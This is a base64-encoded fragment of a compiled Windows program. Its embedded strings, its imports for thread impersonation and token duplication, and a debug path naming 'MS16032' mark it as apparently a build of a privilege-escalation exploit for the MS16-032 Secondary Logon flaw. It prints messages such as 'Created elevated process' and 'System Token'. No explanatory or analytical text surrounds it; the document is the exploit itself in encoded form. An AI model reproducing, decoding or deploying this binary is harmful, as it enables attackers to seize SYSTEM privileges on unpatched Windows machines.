HMALQBOAEkAAABlAHMALQBQAFIAAAB6AGgALQBDAEgAVAAAAAAAcwByAAAAAABhAGYALQB6AGEAAABhAHIALQBhAGUAAABhAHIALQBiAGgAAABhAHIALQBkAHoAAABhAHIALQBlAGcAAABhAHIALQBpAHEAAABhAHIALQBqAG8AAABhAHIALQBrAHcAAABhAHIALQBsAGIAAABhAHIALQBsAHkAAABhAHIALQBtAGEAAABhAHIALQBvAG0AAABhAHIALQBxAGEAAABhAHIALQBzAGEAAABhAHIALQBzAHkAAABhAHIALQB0AG4AAABhAHIALQB5AGUAAABhAHoALQBhAHoALQBjAHkAcgBsAAAAAABhAHoALQBhAHoALQBsAGEAdABuAAAAAABiAGUALQBiAHkAAABiAGcALQBiAGcAAABiAG4ALQBpAG4AAABiAHMALQBiAGEALQBsAGEAdABuAAAAAABjAGEALQBlAHMAAABjAHMALQBjAHoAAABjAHkALQBnAGIAAABkAGEALQBkAGsAAABkAGUALQBhAHQAAABkAGUALQBjAGgAAABkAGUALQBkAGUAAABkAGUALQBsAGkAAABkAGUALQBsAHUAAABkAGkAdgAtAG0AdgAAAAAAZQBsAC0AZwByAAAAZQBuAC0AYQB1AAAAZQBuAC0AYgB6AAAAZQBuAC0AYwBhAAAAZQBuAC0AYwBiAAAAZQBuAC0AZwBiAAAAZQBuAC0AaQBlAAAAZQBuAC0AagBtAAAAZQBuAC0AbgB6AAAAZQBuAC0AcABoAAAAZQBuAC0AdAB0AAAAZQBuAC0AdQBzAAAAZQBuAC0AegBhAAAAZQBuAC0AegB3AAAAZQBzAC0AYQByAAAAZQBzAC0AYgBvAAAAZQBzAC0AYwBsAAAAZQBzAC0AYwBvAAAAZQBzAC0AYwByAAAAZQBzAC0AZABvAAAAZQBzAC0AZQBjAAAAZQBzAC0AZQBzAAAAZQBzAC0AZwB0AAAAZQBzAC0AaABuAAAAZQBzAC0AbQB4AAAAZQBzAC0AbgBpAAAAZQBzAC0AcABhAAAAZQBzAC0AcABlAAAAZQBzAC0AcAByAAAAZQBzAC0AcAB5AAAAZQBzAC0AcwB2AAAAZQBzAC0AdQB5AAAAZQBzAC0AdgBlAAAAZQB0AC0AZQBlAAAAZQB1AC0AZQBzAAAAZgBhAC0AaQByAAAAZgBpAC0AZgBpAAAAZgBvAC0AZgBvAAAAZgByAC0AYgBlAAAAZgByAC0AYwBhAAAAZgByAC0AYwBoAAAAZgByAC0AZgByAAAAZgByAC0AbAB1AAAAZgByAC0AbQBjAAAAZwBsAC0AZQBzAAAAZwB1AC0AaQBuAAAAaABlAC0AaQBsAAAAaABpAC0AaQBuAAAAaAByAC0AYgBhAAAAaAByAC0AaAByAAAAaAB1AC0AaAB1AAAAaAB5AC0AYQBtAAAAaQBkAC0AaQBkAAAAaQBzAC0AaQBzAAAAaQB0AC0AYwBoAAAAaQB0AC0AaQB0AAAAagBhAC0AagBwAAAAawBhAC0AZwBlAAAAawBrAC0AawB6AAAAawBuAC0AaQBuAAAAawBvAGsALQBpAG4AAAAAAGsAbwAtAGsAcgAAAGsAeQAtAGsAZwAAAGwAdAAtAGwAdAAAAGwAdgAtAGwAdgAAAG0AaQAtAG4AegAAAG0AawAtAG0AawAAAG0AbAAtAGkAbgAAAG0AbgAtAG0AbgAAAG0AcgAtAGkAbgAAAG0AcwAtAGIAbgAAAG0AcwAtAG0AeQAAAG0AdAAtAG0AdAAAAG4AYgAtAG4AbwAAAG4AbAAtAGIAZQAAAG4AbAAtAG4AbAAAAG4AbgAtAG4AbwAAAG4AcwAtAHoAYQAAAHAAYQAtAGkAbgAAAHAAbAAtAHAAbAAAAHAAdAAtAGIAcgAAAHAAdAAtAHAAdAAAAHEAdQB6AC0AYgBvAAAAAABxAHUAegAtAGUAYwAAAAAAcQB1AHoALQBwAGUAAAAAAHIAbwAtAHIAbwAAAHIAdQAtAHIAdQAAAHMAYQAtAGkAbgAAAHMAZQAtAGYAaQAAAHMAZQAtAG4AbwAAAHMAZQAtAHMAZQAAAHMAawAtAHMAawAAAHMAbAAtAHMAaQAAAHMAbQBhAC0AbgBvAAAAAABzAG0AYQAtAHMAZQAAAAAAcwBtAGoALQBuAG8AAAAAAHMAbQBqAC0AcwBlAAAAAABzAG0AbgAtAGYAaQAAAAAAcwBtAHMALQBmAGkAAAAAAHMAcQAtAGEAbAAAAHMAcgAtAGIAYQAtAGMAeQByAGwAAAAAAHMAcgAtAGIAYQAtAGwAYQB0AG4AAAAAAHMAcgAtAHMAcAAtAGMAeQByAGwAAAAAAHMAcgAtAHMAcAAtAGwAYQB0AG4AAAAAAHMAdgAtAGYAaQAAAHMAdgAtAHMAZQAAAHMAdwAtAGsAZQAAAHMAeQByAC0AcwB5AAAAAAB0AGEALQBpAG4AAAB0AGUALQBpAG4AAAB0AGgALQB0AGgAAAB0AG4ALQB6AGEAAAB0AHIALQB0AHIAAAB0AHQALQByAHUAAAB1AGsALQB1AGEAAAB1AHIALQBwAGsAAAB1AHoALQB1AHoALQBjAHkAcgBsAAAAAAB1AHoALQB1AHoALQBsAGEAdABuAAAAAAB2AGkALQB2AG4AAAB4AGgALQB6AGEAAAB6AGgALQBjAGgAcwAAAAAAegBoAC0AYwBoAHQAAAAAAHoAaAAtAGMAbgAAAHoAaAAtAGgAawAAAHoAaAAtAG0AbwAAAHoAaAAtAHMAZwAAAHoAaAAtAHQAdwAAAHoAdQAtAHoAYQAAAAAAAAAAAAAAAAAAAAAAAMD//zXCaCGi2g/J/z8AAAAAAADwPwgECAgIBAgIAAQMCAAEDAgAAAAAAAAAAAAA8D9/AjXCaCGi2g/JPkD////////vfwAAAAAAABAAAAAAAAAAmMAAAAAAAACYQAAAAAAAAPB/AAAAAAAAAAAAAAAAFGZBACBmQQAoZkEANGZBAEBmQQBMZkEAWGZBAGhmQQB0ZkEAfGZBAIRmQQCQZkEAnGZBAKZmQQCoZkEAsGZBALhmQQC8ZkEAwGZBAMRmQQDIZkEAzGZBANBmQQDUZkEA4GZBAORmQQDoZkEA7GZBAPBmQQD0ZkEA+GZBAPxmQQAAZ0EABGdBAAhnQQAMZ0EAEGdBABRnQQAYZ0EAHGdBACBnQQAkZ0EAKGdBACxnQQAwZ0EANGdBADhnQQA8Z0EAQGdBAERnQQBIZ0EATGdBAFBnQQBUZ0EAWGdBAFxnQQBoZ0EAdGdBAHxnQQCIZ0EAoGdBAKxnQQDAZ0EA4GdBAABoQQAgaEEAQGhBAGBoQQCEaEEAoGhBAMRoQQDkaEEADGlBAChpQQA4aUEAPGlBAERpQQBUaUEAeGlBAIBpQQCMaUEAnGlBALhpQQDYaUEAAGpBAChqQQBQakEAfGpBAJhqQQC8akEA4GpBAAxrQQA4a0EApmZBAFRrQQBoa0EAhGtBAJhrQQC4a0EAX19iYXNlZCgAAAAAX19jZGVjbABfX3Bhc2NhbAAAAABfX3N0ZGNhbGwAAABfX3RoaXNjYWxsAABfX2Zhc3RjYWxsAABfX3ZlY3RvcmNhbGwAAAAAX19jbHJjYWxsAAAAX19lYWJpAABfX3B0cjY0AF9fcmVzdHJpY3QAAF9fdW5hbGlnbmVkAHJlc3RyaWN0KAAAACBuZXcAAAAAIGRlbGV0ZQA9AAAAPj4AADw8AAAhAAAAPT0AACE9AABbXQAAb3BlcmF0b3IAAAAALT4AACoAAAArKwAALS0AAC0AAAArAAAAJgAAAC0+KgAvAAAAJQAAADwAAAA8PQAAPgAAAD49AAAsAAAAKCkAAH4AAABeAAAAfAAAACYmAAB8fAAAKj0AACs9AAAtPQAALz0AACU9AAA+Pj0APDw9ACY9AAB8PQAAXj0AAGB2ZnRhYmxlJwAAAGB2YnRhYmxlJwAAAGB2Y2FsbCcAYHR5cGVvZicAAAAAYGxvY2FsIHN0YXRpYyBndWFyZCcAAAAAYHN0cmluZycAAAAAYHZiYXNlIGRlc3RydWN0b3InAABgdmVjdG9yIGRlbGV0aW5nIGRlc3RydWN0b3InAAAAAGBkZWZhdWx0IGNvbnN0cnVjdG9yIGNsb3N1cmUnAAAAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYHZpcnR1YWwgZGlzcGxhY2VtZW50IG1hcCcAAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAGBlaCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAYGVoIHZlY3RvciB2YmFzZSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBjb3B5IGNvbnN0cnVjdG9yIGNsb3N1cmUnAABgdWR0IHJldHVybmluZycAYEVIAGBSVFRJAAAAYGxvY2FsIHZmdGFibGUnAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnACBuZXdbXQAAIGRlbGV0ZVtdAAAAYG9tbmkgY2FsbHNpZycAAGBwbGFjZW1lbnQgZGVsZXRlIGNsb3N1cmUnAABgcGxhY2VtZW50IGRlbGV0ZVtdIGNsb3N1cmUnAAAAAGBtYW5hZ2VkIHZlY3RvciBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgbWFuYWdlZCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYGVoIHZlY3RvciBjb3B5IGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBlaCB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAYGR5bmFtaWMgaW5pdGlhbGl6ZXIgZm9yICcAAGBkeW5hbWljIGF0ZXhpdCBkZXN0cnVjdG9yIGZvciAnAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGB2ZWN0b3IgdmJhc2UgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAAAAYG1hbmFnZWQgdmVjdG9yIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAABgbG9jYWwgc3RhdGljIHRocmVhZCBndWFyZCcAIFR5cGUgRGVzY3JpcHRvcicAAAAgQmFzZSBDbGFzcyBEZXNjcmlwdG9yIGF0ICgAIEJhc2UgQ2xhc3MgQXJyYXknAAAgQ2xhc3MgSGllcmFyY2h5IERlc2NyaXB0b3InAAAAACBDb21wbGV0ZSBPYmplY3QgTG9jYXRvcicAAABVAFMARQBSADMAMgAuAEQATABMAAAAAABNZXNzYWdlQm94VwBHZXRBY3RpdmVXaW5kb3cAR2V0TGFzdEFjdGl2ZVBvcHVwAABHZXRVc2VyT2JqZWN0SW5mb3JtYXRpb25XAAAAR2V0UHJvY2Vzc1dpbmRvd1N0YXRpb24AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgACgAKAAoACgAKAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABIABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQAIQAhACEAIQAhACEAIQAhACEAIQAEAAQABAAEAAQABAAEACBAIEAgQCBAIEAgQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAEAAQABAAEAAQABAAggCCAIIAggCCAIIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACABAAEAAQABAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAgACAAIAAoACgAKAAoACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEACEAIQAhACEAIQAhACEAIQAhACEABAAEAAQABAAEAAQABAAgQGBAYEBgQGBAYEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBARAAEAAQABAAEAAQAIIBggGCAYIBggGCAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgECAQIBAgEQABAAEAAQACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAAgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQA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kEA9H5BABAAAAD0oUEAAAAAAP////8AAAAADAAAABouQAAAAAAAEKJBAAAAAAD/////AAAAAAwAAADXSUAAAAAAACyiQQAAAAAA/////wAAAAAMAAAAUC5AAAAAAACRLkAAAAAAADx/QQADAAAATH9BABB/QQD0fkEAAAAAAEyiQQAAAAAA/////wAAAAAMAAAANS5AAAAAAACRLkAAAAAAAHh/QQADAAAAiH9BABB/QQD0fkEAAAAAAGyiQQAAAAAA/////wAAAAAMAAAAay5AAAAAAAD+////AAAAANT///8AAAAA/v///wAAAABdNkAAAAAAAP7///8AAAAA1P///wAAAAD+////AAAAAN02QAAAAAAA/v///wAAAADU////AAAAAP7///8AAAAAYThAAAAAAAD+////AAAAAMT///8AAAAA/v///wAAAADBO0AAAAAAAP7///8AAAAAzP///wAAAAD+////Uj1AAGY9QAAAAAAA/v///wAAAADY////AAAAAP7///9rdkAAh3ZAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAABUeEAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAMV5QAAAAAAA/v///wAAAADY////AAAAAP7////ZgEAA7IBAAAAAAAD+////AAAAANj///8AAAAA/v///7iBQAC8gUAAAAAAAP7///8AAAAA2P///wAAAAD+////hIFAAIiBQAAAAAAA/v///wAAAAC8////AAAAAP7///8AAAAAxINAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAACfh0AAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAABqJQAAAAAAA/v///wAAAADY////AAAAAP7///8AAAAAl45AAP7///8AAAAAo45AAP7///8AAAAA2P///wAAAAD+////AAAAANGPQAD+////AAAAAOCPQAD+////AAAAAHz///8AAAAA/v///wAAAAA8k0AAAAAAAP7///8AAAAA0P///wAAAAD+////AAAAAGCkQAAAAAAAJaRAAC+kQAD+////AAAAALD///8AAAAA/v///wAAAAATmkAAAAAAAGeZQABxmUAA/v///wAAAADY////AAAAAP7///+HoUAAi6FAAAAAAAD+////AAAAANj///8AAAAA/v///1yYQABlmEAAQAAAAAAAAAAAAAAAwJpAAP////8AAAAA/////wAAAAAAAAAAAAAAAAEAAAABAAAAZIJBACIFkxkCAAAAdIJBAAEAAACEgkEAAAAAAAAAAAAAAAAAAQAAAAAAAAD+////AAAAANT///8AAAAA/v///0KjQABGo0AAAAAAAKKYQAAAAAAA7IJBAAIAAAD4gkEA9H5BAAAAAACkokEAAAAAAP////8AAAAADAAAAIeYQAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAEbJAAAAAAAD+////AAAAAMz///8AAAAA/v///wAAAACls0AAAAAAAAAAAABvs0AA/v///wAAAADU////AAAAAP7///8AAAAAL7dAAAAAAAD+////AAAAANT///8AAAAA/v///wAAAAAJ10AAAAAAAP7///8AAAAAzP///wAAAAD+////AAAAANnXQAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAAwdhAAAAAAAD+////AAAAAMj///8AAAAA/v///wAAAABi6EAAAAAAAP7///8AAAAA2P///wAAAAD+////AAAAAH/rQAAAAAAA/v///wAAAADQ////AAAAAP7///8AAAAA1wxBAAAAAAD+////AAAAANj///8AAAAA/v///wAAAABRDkEAtIQBAAAAAAAAAAAAkIYBABwgAQCYhAEAAAAAAAAAAAAYhwEAACABAAAAAAAAAAAAAAAAAAAAAAAAAAAA8IYBAN6GAQDMhgEAsoYBAJ6GAQAGhwEAAAAAAECGAQBShgEAMoYBAHCGAQCAhgEAIIYBABCGAQD8hQEA6IUBANSFAQBghgEAwIUBACaHAQA2hwEARocBAFSHAQBqhwEAgIcBAJaHAQCohwEAuocBAMaHAQDahwEA9ocBAA6IAQAmiAEAMogBAD6IAQBWiAEAcogBAJCIAQCgiAEAyIgBANCIAQDciAEA6ogBAPiIAQACiQEAFIkBACSJAQAwiQEARokBAFiJAQBqiQEAdIkBAICJAQCMiQEAmIkBAK6JAQDAiQEAzokBAOiJAQD+iQEAGIoBADKKAQBMigEAWooBAGqKAQCAigEAkooBAKaKAQC2igEAyIoBANyKAQDsigEA/IoBAAAAAAAJAkdldEN1cnJlbnRQcm9jZXNzAGcCR2V0TW9kdWxlSGFuZGxlVwAADQJHZXRDdXJyZW50VGhyZWFkAABfBVRlcm1pbmF0ZVByb2Nlc3MAAFACR2V0TGFzdEVycm9yAACdAkdldFByb2NBZGRyZXNzAADoAkdldFRocmVhZElkAB8BRHVwbGljYXRlSGFuZGxlAH8AQ2xvc2VIYW5kbGUAWAVTdXNwZW5kVGhyZWFkAKcEUmVzdW1lVGhyZWFkAADoAENyZWF0ZVRocmVhZAAAS0VSTkVMMzIuZGxsAAASAk9wZW5Qcm9jZXNzVG9rZW4AAIwAQ3JlYXRlUHJvY2Vzc1dpdGhMb2dvblcAFwJPcGVuVGhyZWFkVG9rZW4A6gJTZXRUaHJlYWRUb2tlbgAAbwFHZXRUb2tlbkluZm9ybWF0aW9uAO4ARHVwbGljYXRlVG9rZW4AAEFEVkFQSTMyLmRsbAAAIQFFbmNvZGVQb2ludGVyAP4ARGVjb2RlUG9pbnRlcgBRAUV4aXRQcm9jZXNzAGYCR2V0TW9kdWxlSGFuZGxlRXhXAADRA011bHRpQnl0ZVRvV2lkZUNoYXIAywVXaWRlQ2hhclRvTXVsdGlCeXRlAMkBR2V0Q29tbWFuZExpbmVXAD8EUmFpc2VFeGNlcHRpb24AAKwEUnRsVW53aW5kAGcDSXNEZWJ1Z2dlclByZXNlbnQAbQNJc1Byb2Nlc3NvckZlYXR1cmVQcmVzZW50ACUBRW50ZXJDcml0aWNhbFNlY3Rpb24AAKIDTGVhdmVDcml0aWNhbFNlY3Rpb24AADgDSGVhcFNpemUAADMDSGVhcEZyZWUAAAUBRGVsZXRlQ3JpdGljYWxTZWN0aW9uAIAFVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABBBVNldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgAKBVNldExhc3RFcnJvcgAASANJbml0aWFsaXplQ3JpdGljYWxTZWN0aW9uQW5kU3BpbkNvdW50AFAFU2xlZXAAcQVUbHNBbGxvYwAAcwVUbHNHZXRWYWx1ZQB0BVRsc1NldFZhbHVlAHIFVGxzRnJlZQC+AkdldFN0YXJ0dXBJbmZvVwDAAkdldFN0ZEhhbmRsZQAA3wVXcml0ZUZpbGUAYwJHZXRNb2R1bGVGaWxlTmFtZVcAAKcDTG9hZExpYnJhcnlFeFcAAHIDSXNWYWxpZENvZGVQYWdlAKQBR2V0QUNQAACGAkdldE9FTUNQAACzAUdldENQSW5mbwAvA0hlYXBBbGxvYwAOAkdldEN1cnJlbnRUaHJlYWRJZAAAogJHZXRQcm9jZXNzSGVhcAAAPgJHZXRGaWxlVHlwZQAtBFF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAAoCR2V0Q3VycmVudFByb2Nlc3NJZADWAkdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lACcCR2V0RW52aXJvbm1lbnRTdHJpbmdzVwAAnQFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwA2A0hlYXBSZUFsbG9jAJYDTENNYXBTdHJpbmdXAAD6A091dHB1dERlYnVnU3RyaW5nVwAAxQJHZXRTdHJpbmd